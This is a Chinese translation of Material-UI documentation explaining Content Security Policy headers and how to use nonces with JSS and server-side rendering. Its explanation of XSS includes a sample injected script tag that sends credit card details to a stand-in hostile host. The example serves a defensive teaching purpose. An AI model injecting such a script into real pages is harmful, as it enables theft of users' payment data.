# 内容安全政策（CSP）

<p class="description">Material-UI支持内容安全策略标头。</p>

## 什么是 CSP，为什么它有用？

基本上，CSP 通过要求开发人员将其资产从中检索的源列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的标头返回。 例如，假设您有一个托管在`https://example.com`的网站 CSP 头`default-src：'self';`将允许位于`https://example.com/*`的所有资产并否认所有其他人。 如果您的网站的某个部分容易受到 XSS 的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>

此漏洞允许攻击者执行任何操作。 但是，使用安全的 CSP 标头，浏览器将不会加载此脚本。

您可以在此处阅读有关 CSP [的更多信息](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) 。

## 如何实现 CSP？

为了将 CSP 与 Material-UI（和 JSS）一起使用，您需要使用 nonce。 随机数是一个随机生成的字符串，只使用一次，因此您需要添加服务器中间件以在每个请求上生成一个。 JSS 有[一个很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)关于如何使用 Express 和 React Helmet 实现这一目标。 对于基本纲要，请继续阅读。

CSP nonce 是 Base 64 编码的字符串。 你可以这样生成一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

使用 UUID 版本 4 非常重要，因为它会生成**不可预测**串。 然后，将此随机数应用于 CSP 标头。 应用了随机数时，CSP 标头可能如下所示：

```js
header('Content-Security-Policy').set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

如果使用服务器端呈现（SSR），则应在服务器上的`<style>`标记中传递 nonce。

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() }}
/>
```

然后，您必须将此随机数传递给 JSS，以便将其添加到后续`<style>`标记中。 客户端从头部获取 nonce。 无论是否使用 SSR，都必须包含此标头。

```jsx
<meta property="csp-nonce" content={nonce} />
```
